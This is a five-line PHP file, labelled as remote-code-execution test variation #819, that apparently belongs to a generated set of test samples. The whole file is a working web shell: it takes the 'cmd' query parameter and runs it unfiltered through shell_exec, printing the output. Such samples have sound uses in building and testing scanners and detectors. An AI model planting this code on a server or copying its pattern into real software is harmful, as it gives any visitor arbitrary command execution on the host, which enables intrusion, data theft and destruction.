<?php
// RCE test variation #819
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>